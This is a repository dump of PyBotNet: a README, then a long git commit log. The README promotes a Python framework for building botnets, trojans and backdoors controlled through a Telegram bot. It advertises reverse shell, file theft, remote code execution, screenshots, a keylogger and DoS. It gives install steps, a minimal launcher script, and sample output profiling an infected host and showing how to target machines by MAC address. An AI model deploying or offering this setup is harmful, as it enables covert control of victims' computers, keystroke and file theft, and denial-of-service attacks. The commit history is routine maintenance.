@@ -1,0 +1,3683 @@
+======================: FILES :======================
+======================: README CONTENT :======================
+
+ <p align="center">
+    <a href='https://github.com/onionj/pybotnet' target='_blank'><img src='https://files.virgool.io/upload/users/271869/posts/wxs2bk9hkqfx/ezoxwssoikqm.jpeg' border='5' alt='trojan horse'/></a>
+    <h1 align="center">PyBotNet</h1>
+    <p align="center"> 
+    A Python framework for building <b>remote control</b>, <b>botnet</b> , <b>trojan</b>  or <b>backdoor</b> with Telegram or other control panels
+    </p>
+  <p align="center">
+    <a href="https://github.com/onionj/pybotnet">
+      <img src="https://img.shields.io/pypi/v/pybotnet?label=pybotnet" />
+    </a>
+    <a href="https://github.com/onionj/pybotnet/blob/master/LICENSE">
+      <img src="https://img.shields.io/github/license/onionj/pybotnet" />
+    </a>
+    <a href="https://www.python.org/">
+    	<img src="https://img.shields.io/pypi/pyversions/pybotnet" />
+    </a>
+  </p>
+</p>
+ 
+
+> Disclaimer: Please note that this is a research project. I am by no means responsible for any usage of this tool. Use it on your behalf!. 
+
+---
+
+**Source Code**: <a href="https://github.com/onionj/pybotnet" target="_blank">https://github.com/onionj/pybotnet</a>
+
+**Documentation**: <a href="https://onionj.github.io/pybotnet/" target="_blank">https://onionj.github.io/pybotnet/</a>
+
+**ToDo List**: <a href="https://github.com/users/onionj/projects/1" target="_blank">https://github.com/users/onionj/projects/1</a>
+
+---
+
+### Features:
+* Built in Telegram control pannel and proxy
+* Built in scripts like:
+    * reverse shell
+    * put or get file
+    * run python code on target systems
+    * get screenshot
+    * keylogger
+    * dos
+    * scheduler
+    * ...
+* Cross platform
+* Ability to easily add custom scripts
+* Import external scripts
+* Ability to add custom control panel
+* Add remote control to your apps
+* [...](https://onionj.github.io/pybotnet/)
+
+
+### Install PyBotNet
+
+```console
+pip3 install pybotnet -U
+```
+
+* `-U`: make sure to upgrade framework to latest version.
+
+
+#### The simplest PyBotNet file could look like this:
+
+
+```py title="main.py"
+# in main.py
+from pybotnet import BotNet, TelegramEngine
+
+
+telegram_engine = TelegramEngine(token=TELEGRAM_TOKEN, admin_chat_id=ADMIN_CHAT_ID) #(1)
+
+botnet = BotNet(telegram_engine) # (2)
+botnet.run()
+```
+
+1. create engine: Engines transfer messages between admin and botnet
+2. create BotNet instance
+
+
+#### note:
+  * `TELEGRAM_TOKEN`: You can use telegram `@botfather` to Create new telegram API Bot and get your `TELEGRAM_TOKEN` 
+  * `ADMIN_CHAT_ID`: Get it from @userinfobot telegram bot
+  * PyBotNet include default scripts, like: `/shell`, `/put_file`, `/get_file`, `/screenshot`, `/who`, ...,
+    you can send `/help` to your telegram bot and see more detail..
+
+#### Run code:
+
+```console 
+python3 main.py
+```
+
+#### telegram engine
+
+open telegram and send `/who` to your bot; If you have done the steps correctly, you recive message like this:
+
+```
+scripts_name:
+    echo
+    who
+    shell
+    screenshot
+    put_file
+    get_file
+    runcode
+    openurl
+    dos
+    schedule
+
+mac_addres: 228362405364
+os: Linux
+global_ip: 5.10.30.35
+country: Iran, Islamic Republic of
+bot_name: no_name
+local_ip: {'192.168.23.1'}
+host_name: {'system_name'}
+system_user: root
+up_time: 0:00:01
+current_route: /
+pid: 148352
+cpu_count: 8
+pybotnet_version: 2.0.8b0
+from cache: True
+```
+
+
+you can send `/help` to see help page, or send `/help <script_name>` to recive more help about specific script.
+
+for example send `/help screenshot`, You will receive:
+
+```
+NAME:
+screenshot
+
+DESCRIPTION:
+get screen shot
+    * `[mac-address] /screenshot`
+    or
+    * `/screenshot`
+
+    example command: 
+        * `94945035671481 /screenshot`
+        * `/screenshot` 
+
+    return: img or img-download-link
+    
+
+script_version: 0.0.1
+default_script: True
+
+___________________________
+scripts_name: ['echo', 'who', 'shell', 'screenshot', 'put_file', 'get_file', 'runcode', 'openurl', 'dos', 'schedule']
+mac_addres: 228362405364
+os: Linux
+global_ip: 5.10.30.35
+country: Iran, Islamic Republic of
+bot_name: no_name
+use_proxy: False
+```
+
+in top of message you see script name, description, syntax and examples.
+
+for run screenshot script you have two choice:
+
+* Run the script on all clients that are listening to Telegram bot (for now we have one!)
+* Run script on one specific system
+
+for run script on all client send `/screenshot`.
+
+bot if you need get screen shot on specific system you need send `[mac_addres] /screenshot` for our case: `228362405364 /screenshot`
+
+in some case like `/shell` you need to run it just for one system.
+
+
+
+### *For more, see [Documentation](https://onionj.github.io/pybotnet/)*
+
+
+---
+
+## Contributors ✨
+Thanks goes to these wonderful people :
+
+<table>
+<td align="center"><a href="https://github.com/onionj"><img src="https://avatars.githubusercontent.com/u/77416478?v=4" width="70px;" alt=""/><br /><sub><b>oNion</b></sub></a><br /></td>
+<td align="center"><a href="https://github.com/TorhamDev"><img src="https://avatars.githubusercontent.com/u/87639984?v=4" width="70px;" alt=""/><br /><sub><b> TorhamDev</b></sub></a><br /></td>
+<td align="center"><a href="https://github.com/SepehrRasouli"><img src="https://avatars.githubusercontent.com/u/81516241?v=4" width="70px;" alt=""/><br /><sub><b> SepehrRasouli</b></sub></a><br /></td>
+</table>
+
+====================== GIT HISTORY: ======================
+817745b HEAD@{0}: clone: from https://github.com/onionj/pybotnet
+commit 817745bd20aa56eee23e2632f0a46846012b4e56
+Merge: 6068bbb 538f745
+Author: Saman Nezafat <77416478+onionj@users.noreply.github.com>
+Date:   Wed Nov 16 10:04:51 2022 +0330
+
+    Merge pull request #40 from onionj/dependabot/pip/pillow-9.3.0
+    
+    Bump pillow from 9.2.0 to 9.3.0
+
+commit 538f7450a7a7a62c82a70e4d6328164d2fa910b5
+Author: dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>
+Date:   Tue Nov 15 13:37:19 2022 +0000
+
+    Bump pillow from 9.2.0 to 9.3.0
+    
+    Bumps [pillow](https://github.com/python-pillow/Pillow) from 9.2.0 to 9.3.0.
+    - [Release notes](https://github.com/python-pillow/Pillow/releases)
+    - [Changelog](https://github.com/python-pillow/Pillow/blob/main/CHANGES.rst)
+    - [Commits](https://github.com/python-pillow/Pillow/compare/9.2.0...9.3.0)
+    
+    ---
+    updated-dependencies:
+    - dependency-name: pillow
+      dependency-type: direct:production
+    ...
+    
+    Signed-off-by: dependabot[bot] <support@github.com>
+
+commit 6068bbb6b893f2d22b76c20cb0f010729f37a06b
+Author: Saman Nezafat <77416478+onionj@users.noreply.github.com>
+Date:   Tue Nov 8 09:24:33 2022 +0330
+
+    update ToDo List link
+
+commit 6028a62419f0fd644fcf3e881a101d046a805a37
+Author: Saman Nezafat <77416478+onionj@users.noreply.github.com>
+Date:   Tue Nov 8 09:23:10 2022 +0330
+
+    Update README.md
+
+commit f5314b4c2376e3ed36aaadcaf2910ce6739937cf
+Author: Saman Nezafat <onionj98@gmail.com>
+Date:   Sun Oct 23 15:05:07 2022 +0330
+
+    remove an unused import
+
+commit 7058e5fd5ac13ad819f0c9ccb7dbbb7dd89b605d
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Sep 3 14:21:50 2022 +0430
+
+    change pypi package bio and keywords
+
+commit 9c32c4fe8f2ffc34249a6fc8425ab0efa9e043a2
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Sep 3 14:12:45 2022 +0430
+
+    fix BaseEngine and TestEngine, add (additionalـinfo: dict = {}) to send_file method
+
+commit 33c1bba8eea5f4bc43a5714dacde74c283377d93
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Aug 16 17:44:26 2022 +0430
+
+    change version to 2.2.1
+
+commit 4a5c8450790aa1a3e53cfe90b004f957e74fa2b2
+Merge: 077a58c fed3c96
+Author: Saman Nezafat <77416478+onionj@users.noreply.github.com>
+Date:   Tue Aug 16 17:42:02 2022 +0430
+
+    Merge pull request #37 from onionj/typing-issue-for-python3_8
+    
+    fix typing for python 3.8
+
+commit fed3c9642e3f064e388021dea3a30258882d7996
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Aug 16 17:22:11 2022 +0430
+
+    fix typing for python 3.8
+
+commit 077a58cd08883bbf3bb360d1c3f45735bd4f27bf
+Merge: d412da7 dbc13b2
+Author: SepehrRS <sepehrrs06@gmail.com>
+Date:   Mon Aug 8 05:16:01 2022 +0000
+
+    Merge pull request #34 from onionj/update-docs
+    
+    update docs: running_pybotnet_without_coding
+
+commit dbc13b2098ced0031cc2a1c6acdc59f23ca7a429
+Author: SepehrRS <sepehrrs06@gmail.com>
+Date:   Mon Aug 8 05:10:28 2022 +0000
+
+    Update running_pybotnet_without_coding.md
+
+commit 0d125e8a2c3722b9720728a58e728fda69b0b3ba
+Author: Saman Nezafat <onionj98@gmail.com>
+Date:   Sun Aug 7 23:31:39 2022 +0430
+
+    fix typo (running_pybotnet_without_coding.md)
+
+commit 25fe573c31e8af752bf7f1ac1d5639fe62c6f03d
+Author: Saman Nezafat <onionj98@gmail.com>
+Date:   Sun Aug 7 23:23:41 2022 +0430
+
+    update docs: running_pybotnet_without_coding
+
+commit d412da722e24284f620071b1e13e618113b5fa36
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Aug 5 16:23:23 2022 +0430
+
+    improve /help and improve Run syntax
+
+commit ef3622697673bd916276ed4d47a8753bedc4f2e6
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Aug 5 15:25:58 2022 +0430
+
+    move bot_name up, in system info
+
+commit 78bf884e0ee194dfc12e08dd3f96bf7e3b197e5d
+Author: onionj <onionj98@gmail.com>
+Date:   Mon Aug 1 10:04:56 2022 +0430
+
+    add docs to README.md
+
+commit bfd5a9aae210012c84f51a929094bbed06fef1f7
+Author: onionj <onionj98@gmail.com>
+Date:   Mon Aug 1 10:03:21 2022 +0430
+
+    add docs to README.md
+
+commit 4d3761e464b8197716135e4fbda896e56631eb63
+Author: onionj <onionj98@gmail.com>
+Date:   Thu Jul 28 03:53:09 2022 +0430
+
+    change install_as_service.sh
+
+commit 27fe3f696d47386ad5cd209f9bb04c78a6398031
+Author: onionj <onionj98@gmail.com>
+Date:   Thu Jul 28 03:49:57 2022 +0430
+
+    change install_as_service.sh
+
+commit 911bff0142bc6ba672c29a5b9a13abbfdae2577b
+Author: onionj <onionj98@gmail.com>
+Date:   Thu Jul 28 02:59:25 2022 +0430
+
+    convert context class to a data class
+
+commit d32e55461a1d6f872c644dad6127174484c6b4a4
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Jul 26 14:04:04 2022 +0430
+
+    command mac or bot name check twice
+
+commit c5eaa4535d83de0488f5a7172a14e004cc2fddfe
+Author: Saman Nezafat <77416478+onionj@users.noreply.github.com>
+Date:   Tue Jul 19 18:17:56 2022 +0430
+
+    Create codeql-analysis.yml
+
+commit 2dd3fee53b04ece45fe5b426ef358c94ff044396
+Author: onionj <onionj98@gmail.com>
+Date:   Mon Jul 4 20:50:17 2022 +0430
+
+    change docs for bot_name
+
+commit 9d75764c764a2af5fb53fe49acdddfed23ed7915
+Author: onionj <onionj98@gmail.com>
+Date:   Mon Jul 4 20:44:17 2022 +0430
+
+    add call botnet by bot_name, ('test_name /who')
+
+commit 3ab6194f98988909db9ed2a290b222ac30bff45b
+Author: onionj <onionj98@gmail.com>
+Date:   Mon Jul 4 20:10:14 2022 +0430
+
+    add replay to message in engines
+
+commit ed8cd0bc0c0e5d2faf12f70c064a4ab055ad799e
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jul 2 16:29:10 2022 +0430
+
+    upgrade to verison 2.1.0
+
+commit eec1e36ba24be9ec9d0794aa230e521177f90e3a
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jul 2 15:38:28 2022 +0430
+
+    update /runcode , /screenshot docstring
+
+commit 612f70f181541eab4ab72f9008a4c3f9427e93ab
+Author: onionj <onionj98@gmail.com>
+Date:   Thu Jun 30 13:20:37 2022 +0430
+
+    fix typo in docs
+
+commit 7bd939c413ff618c5d9a5287615ae0b460c0c30d
+Author: onionj <onionj98@gmail.com>
+Date:   Thu Jun 30 13:17:09 2022 +0430
+
+    add more detail for telegram @botfather
+
+commit effcd02802609507d61f0111f293dbff74005f08
+Author: onionj <onionj98@gmail.com>
+Date:   Thu Jun 30 13:08:22 2022 +0430
+
+    refactor add_custom_script.md
+
+commit a01a23aa9b0308aa632a2346579f0e7754c4a628
+Author: onionj <onionj98@gmail.com>
+Date:   Thu Jun 30 13:02:56 2022 +0430
+
+    refactor add_custom_script.md
+
+commit d0d1b44d76ff08f4a5c78c0905f2742b9d7b78f2
+Merge: 12bbdb2 4dafa49
+Author: SepehrRS <81516241+SepehrRasouli@users.noreply.github.com>
+Date:   Tue Jun 28 09:50:29 2022 +0000
+
+    Merge pull request #32 from onionj/fix-readme-file
+    
+    add install command and Contributors to readme.md
+
+commit 4dafa49899737663f54022563a5a81e288af5f13
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Jun 28 14:17:00 2022 +0430
+
+    add install command and Contributors to readme.md
+
+commit 12bbdb25fab8981e8d5a261039be33bd5568fb97
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Jun 28 13:31:07 2022 +0430
+
+    change docs running_pybotnet_without_coding.md file
+
+commit 8cd589917fbdd9da1925ef24c2de289d3b1c972d
+Merge: 1ecb344 e2a4e38
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Tue Jun 28 13:24:28 2022 +0430
+
+    Merge pull request #31 from SepehrRasouli/master
+    
+    Changed run_module to running_pybotnet_without_coding
+
+commit e2a4e3867dda372bf6cef17ee1a691d1b7d30688
+Merge: 78b33ea 1ecb344
+Author: SepehrRS <81516241+SepehrRasouli@users.noreply.github.com>
+Date:   Tue Jun 28 08:01:17 2022 +0000
+
+    Merge branch 'onionj:master' into master
+
+commit 78b33eadb42b3abfb431316cecbdc541f804fec8
+Author: SepehrRasouli <sepehrrs06@gmail.com>
+Date:   Tue Jun 28 12:28:34 2022 +0430
+
+    changed mkdocs yml file
+
+commit 42fdee1f7dc14dd3c2e98f0fae5d2626a4e835b6
+Author: SepehrRasouli <sepehrrs06@gmail.com>
+Date:   Tue Jun 28 12:28:22 2022 +0430
+
+    changed run module to running pybotnet without coding
+
+commit 1ecb34464ac65c2af3543114683847db70c80f13
+Merge: 50399be 50f5082
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Tue Jun 28 11:52:51 2022 +0430
+
+    Merge pull request #29 from SepehrRasouli/master
+    
+    Changed Document's
+
+commit 50f5082d7e107f73fcc8db0ffc7eee0cf209bb23
+Author: SepehrRasouli <sepehrrs06@gmail.com>
+Date:   Tue Jun 28 11:49:08 2022 +0430
+
+    removed version
+
+commit 0c9a5c98859bbc6b36d82bd77d952e2b24116112
+Author: SepehrRasouli <sepehrrs06@gmail.com>
+Date:   Tue Jun 28 11:35:28 2022 +0430
+
+    fixed english
+
+commit bc94b152c13a5ad70439a2423b40f2a1b6128a42
+Author: SepehrRasouli <sepehrrs06@gmail.com>
+Date:   Tue Jun 28 10:47:19 2022 +0430
+
+    changed yml files to fix run_in_ background
+
+commit 758e4c5b4b00a8fcba7628e7b9abe75e73fd36cc
+Author: SepehrRasouli <sepehrrs06@gmail.com>
+Date:   Tue Jun 28 10:46:56 2022 +0430
+
+    removed space in run in backgrgorund
+
+commit 396b132f0efc172f126f41da885c44799d070ff7
+Author: SepehrRasouli <sepehrrs06@gmail.com>
+Date:   Tue Jun 28 10:46:14 2022 +0430
+
+    changed external_scripts
+
+commit c9a8b3739a68e97d668d12b5a0c46d665e2e2fe7
+Author: SepehrRasouli <sepehrrs06@gmail.com>
+Date:   Tue Jun 28 10:45:30 2022 +0430
+
+    changed config botnet class
+
+commit c039452ee731038337ec32590256c6aec82907d6
+Author: SepehrRasouli <sepehrrs06@gmail.com>
+Date:   Tue Jun 28 10:45:12 2022 +0430
+
+    changed add custom script doc
+
+commit 50399bea442c41ea685a99ab128783aae6a57632
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Jun 28 08:56:48 2022 +0430
+
+    change colorr to Purple
+
+commit 765b6c4b99af24ef10d20f1925cbccd1dde19d6b
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Jun 28 08:46:41 2022 +0430
+
+    change name md file
+
+commit ee9d0ac574800af45527db847a7d8ebdcb8bc068
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Jun 28 08:45:23 2022 +0430
+
+    create new md file
+
+commit 5e86830fc9ea84b74c494fdc470cab9dd22691a7
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Jun 28 08:33:47 2022 +0430
+
+    typo from docs/run_module
+
+commit 3b388452f9ca6b1b248006a3302d4d8cad214737
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Jun 28 08:30:34 2022 +0430
+
+    update docs
+
+commit 542d8ad7f802f4921da6e4664d86a36d5d8b0ca9
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Jun 28 00:54:55 2022 +0430
+
+    add https://onionj.github.io/pybotnet/ link to end of readme.md
+
+commit 8e76f571e68ec80dc509e1c728a29aeefe8d998d
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Jun 28 00:42:04 2022 +0430
+
+    fix typo
+
+commit 986da0aef58d2e210203a73f9d2ffd8e74f7e2f2
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Jun 28 00:33:17 2022 +0430
+
+    pep8, create new docs
+
+commit 8b60804fa9dde80a1c5ab65b2b0b9eb6f32581a7
+Author: onionj <onionj98@gmail.com>
+Date:   Mon Jun 27 22:17:14 2022 +0430
+
+    change return str from keylogger and schedule
+
+commit c55d7f669c67a3e6ea0a50467c0a451cae540356
+Author: onionj <onionj98@gmail.com>
+Date:   Mon Jun 27 21:02:54 2022 +0430
+
+    update docs
+
+commit ab6f554253e984abed9e082220594375a5381149
+Author: onionj <onionj98@gmail.com>
+Date:   Mon Jun 27 21:02:09 2022 +0430
+
+    update docs
+
+commit 2bfa45608283733425ce4fdf0215b6fb19f8fbce
+Author: onionj <onionj98@gmail.com>
+Date:   Mon Jun 27 20:39:20 2022 +0430
+
+    update docs
+
+commit 76bb65f01249e66c43efaec11701e0cb54651869
+Author: onionj <onionj98@gmail.com>
+Date:   Mon Jun 27 20:25:54 2022 +0430
+
+    update readme.md
+
+commit 782994a397be03eecae28898a0c0ed22ed9b6b94
+Author: onionj <onionj98@gmail.com>
+Date:   Mon Jun 27 19:58:13 2022 +0430
+
+    add first_step to docs
+
+commit 52a7ffcfa5a044e11d483e55e7e90e384ecfe72a
+Author: onionj <onionj98@gmail.com>
+Date:   Mon Jun 27 17:23:46 2022 +0430
+
+    rebuild dos script
+
+commit 6b060d7a7c82e42e169f4dca65e053dd021d94f3
+Author: onionj <onionj98@gmail.com>
+Date:   Mon Jun 27 10:42:05 2022 +0430
+
+    up version
+
+commit 399285b769d084062f6096aaff2051dff50fd761
+Author: onionj <onionj98@gmail.com>
+Date:   Mon Jun 27 10:41:19 2022 +0430
+
+    edit type in docs
+
+commit 5a238104180934da54fe4004182a8c0d2a003d9a
+Author: onionj <onionj98@gmail.com>
+Date:   Mon Jun 27 10:21:04 2022 +0430
+
+    change stop signal str
+
+commit 17b2359a1253610f18de96c53df2b09752b4408c
+Author: onionj <onionj98@gmail.com>
+Date:   Mon Jun 27 10:11:10 2022 +0430
+
+    add run_background, stop_background
+
+commit 6fc60b1fc45ddb79fc13c470bc89b89b0d250b0a
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 26 21:52:38 2022 +0430
+
+    change commit name
+
+commit 7a32de3d23899b8eb264bfb630a34cb8006ac3bb
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 26 21:49:20 2022 +0430
+
+    change version
+
+commit d9657f4d2f4d34e75bd1e5e08fb23a5ac52bb686
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 26 21:46:27 2022 +0430
+
+    try except for import keylogger
+
+commit b41d1bd3295c9f588bdb2b84922f72a2e8f1f909
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 26 21:46:21 2022 +0430
+
+    try except for import keylogger
+
+commit 41e5d7d597fe09d74680feacfe7eb8f49e7a8544
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 26 21:13:39 2022 +0430
+
+    add image to docs
+
+commit 1f7c3f25300c8b482175b8fa9d5e355761faef5a
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 26 21:10:42 2022 +0430
+
+    add image to docs
+
+commit 8da3ca09bf7ecd37bddade2b27bc3d574ff92651
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 26 21:00:40 2022 +0430
+
+    create Makefile
+
+commit 2b06dc961cfa3700149517292176e011163ccde7
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 26 20:37:29 2022 +0430
+
+    init mkdocs
+
+commit 47ff5915451162c61c38e4b3ab101d053b2b4e31
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 26 20:03:14 2022 +0430
+
+    edit md files
+
+commit 036a38e405fd6852685f74367fe1c04f0eb8efe1
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 26 20:00:55 2022 +0430
+
+    edit md files
+
+commit 05896fdb2566dfa7c268c14de1f2572ae4fa8d39
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 26 19:59:55 2022 +0430
+
+    edit md files
+
+commit bef64d8b29274808803c9b5204fa11d297a2aed5
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 26 19:47:52 2022 +0430
+
+    add mkdocs
+
+commit fb11ac094a7ff1c8d8a57f5ff4b2a55889f9b364
+Merge: da2fa69 7bdb06e
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 26 18:31:55 2022 +0430
+
+    Merge branch 'master' into develop
+
+commit da2fa69feb7da7782971bed9f46a861eb489cf1a
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 26 18:16:52 2022 +0430
+
+    add keylogger script, debug context global values, edit schdule docs
+
+commit b3f36123d688f3e691e32fae1977d18ee4c44b38
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jun 25 21:16:14 2022 +0430
+
+    init keylogger
+
+commit 8c69f9afd7ec854984a5ddd54118de483acf590e
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jun 25 21:09:25 2022 +0430
+
+    change logger first string
+
+commit 04577c2d7ca30abf8ab96968b64ec32fda03be2e
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jun 25 19:41:46 2022 +0430
+
+    change Request to Context
+
+commit c0a67e6fb9a9de72d892b9b12f6039ffe875f257
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jun 25 01:33:28 2022 +0430
+
+    performe schedule script
+
+commit 94970888641fa663b63c2c758241607525d2bad0
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jun 25 01:14:24 2022 +0430
+
+    debug schedule command..
+
+commit 5e18856d04953bb04636d31ac122cf44e7c7fd6b
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Jun 24 23:59:06 2022 +0430
+
+    addd  scheduler.py, have bug!
+
+commit b8b17d8847efb165a9dd888e053a0af8fd445031
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Jun 24 18:40:40 2022 +0430
+
+    add dos script
+
+commit d00d57ae48944faea7751983c20563431d31479e
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Jun 24 16:55:21 2022 +0430
+
+    edit readme.md
+
+commit a5097f831af13b177ba948f954bac7e40dbbc42a
+Author: onionj <onionj98@gmail.com>
+Date:   Wed Jun 22 20:03:07 2022 +0430
+
+    fix install.sh
+
+commit 9127337f47705fbc216ee38bacf97697e37f8fe3
+Author: onionj <onionj98@gmail.com>
+Date:   Wed Jun 22 19:41:28 2022 +0430
+
+    change install.sh
+
+commit 3d26be10e90ec69518a7b94702bcf228e21c2e4e
+Author: onionj <onionj98@gmail.com>
+Date:   Wed Jun 22 18:50:09 2022 +0430
+
+    rename install.sh
+
+commit 1fe442c0909ae87efcf5d4edb713603dadc6ea4e
+Author: onionj <onionj98@gmail.com>
+Date:   Wed Jun 22 18:37:21 2022 +0430
+
+    add openurl script and simple_serializer
+
+commit ed8b0f58c514752ddd4b11a98120b3cdfe03644b
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Jun 17 16:18:12 2022 +0430
+
+    upgrade /shell
+
+commit c430644129ef9e949b9abe9a4a0c9e493d748818
+Author: onionj <onionj98@gmail.com>
+Date:   Thu Jun 16 13:45:47 2022 +0430
+
+    edit project title in readme.md file
+
+commit 2912f8b920e114652eddcafd6a094f75a61bd4b4
+Author: onionj <onionj98@gmail.com>
+Date:   Wed Jun 15 00:34:43 2022 +0430
+
+    add some comment
+
+commit 919ca5d1a9ea319de044600930525f82c2d0fc16
+Author: onionj <onionj98@gmail.com>
+Date:   Wed Jun 15 00:30:11 2022 +0430
+
+    if os.getlogin() failed, in linux system get 'whoami'
+
+commit dd19741b9d0c26ea889c17a0ea928536311b2a0d
+Author: onionj <onionj98@gmail.com>
+Date:   Wed Jun 15 00:11:57 2022 +0430
+
+    add OSError exception for screenshot
+
+commit 7c4dc01ad6229f37e61a6b1afe5dcd6dc0c4ce14
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 12 15:45:54 2022 +0430
+
+    add pybotnet version
+
+commit 409cef021faf6cdb2fae3817ff34d3ef25e7f96d
+Merge: b79a4ac 0a5b11d
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 12 15:37:27 2022 +0430
+
+    Merge branch 'develop' of https://github.com/onionj/pybotnet into develop
+
+commit b79a4acb12b4879a01d695265bee12c877490f06
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 12 15:37:23 2022 +0430
+
+    add help for update botnet
+
+commit 0a5b11dbb7c9895a5ac320fd13098e135cf0c7dd
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 12 15:34:36 2022 +0430
+
+    add help for update botnet
+
+commit 9caf7255e04ff54ad14024599a52e70b3fa22f0a
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 12 15:22:42 2022 +0430
+
+    create /runcode script
+
+commit c1d230b23755c6253915f1cf715460c328598a9c
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 12 15:21:17 2022 +0430
+
+    add split by space, telegram engine
+
+commit 93298c66f8ae6e4d0d9aafe0e8b0ba852be4b32e
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 12 00:52:48 2022 +0430
+
+    fix typo
+
+commit 5ef9cacbfb2cd119cfb307c814992d184f0462dd
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 12 00:42:15 2022 +0430
+
+    fix typo
+
+commit 1aea27271c9cfa3dd47b5f5d097706581730f377
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 12 00:36:49 2022 +0430
+
+    update install.sh, change apt to apt-get
+
+commit f537f171603b142adfd5567ef94f29b819ee4518
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jun 11 18:20:21 2022 +0430
+
+    create install.sh file
+
+commit 762a61b24972f051d8679d7ccf123aeb1e153cd5
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jun 11 16:24:47 2022 +0430
+
+    fix /screenshot command , root command
+
+commit 42f6ca914a315462f49b4754f846831af9643733
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jun 11 15:55:57 2022 +0430
+
+    fix log in __main__.py
+
+commit 02e644cca7ca55dbfd2d269e8257c88c44dedb20
+Merge: 07e32a8 dc4ec1c
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jun 11 15:38:19 2022 +0430
+
+    Merge branch 'develop' of https://github.com/onionj/pybotnet into develop
+
+commit 07e32a8cf21e8d4d2b79f7ceb28cbd4a45567c2f
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jun 11 15:30:43 2022 +0430
+
+    use argparse in __main__.py
+
+commit dc4ec1c7eadb5c2c9e8b031423080ce8a56f1d6b
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jun 11 15:30:43 2022 +0430
+
+    use argparse in __main__.py
+
+commit e7ecb0304dd947c9d6eb16623ceaa353b55089ab
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jun 11 13:47:00 2022 +0430
+
+    fix __main__.py  and botnet.shand move to 2.0.0b4
+
+commit 89057f30608674cb43a512bd1be6d47b805af377
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jun 11 13:23:38 2022 +0430
+
+    fix __main__.py and move to 2.0.0b3
+
+commit f394b4b23b4660e5cbb67b9e9b8c635228a9e49b
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jun 11 13:10:46 2022 +0430
+
+    move to 2.0.0b2
+
+commit 0e39c8acd68c40c04d4092648c1a474947a7013a
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jun 11 13:09:02 2022 +0430
+
+    bash file fo add botnet to linux service
+
+commit acbe1dace07b90902f7a547907eb9ac488f5802a
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jun 11 13:06:46 2022 +0430
+
+    bash file fo add botnet to linux service
+
+commit e92ed35e375ae64541f972253192fd03b0d07685
+Author: onionj <onionj98@gmail.com>
+Date:   Thu Jun 9 00:31:32 2022 +0430
+
+    create pre relase verion 2.0.0b0
+
+commit 6240b00c854481fc32984500f7dbad1a390f0ba7
+Author: onionj <onionj98@gmail.com>
+Date:   Wed Jun 8 18:08:46 2022 +0430
+
+    add TODO for fix pillw
+
+commit 95b552ccf14bcf1949e06a08b8b8913b73c40a1b
+Author: onionj <onionj98@gmail.com>
+Date:   Wed Jun 8 17:59:02 2022 +0430
+
+    add additionalـinfo for screenshot
+
+commit 141e2bd6517ab0494eb91c6980ac5e211ab50020
+Author: onionj <onionj98@gmail.com>
+Date:   Wed Jun 8 17:51:55 2022 +0430
+
+    typo: cashe to cache, replace & to [and] in telegram engine  & is invalid character for telegram
+
+commit f61c424a86028db4085cc41d2f0c0bdbd4d00931
+Author: onionj <onionj98@gmail.com>
+Date:   Wed Jun 8 17:37:23 2022 +0430
+
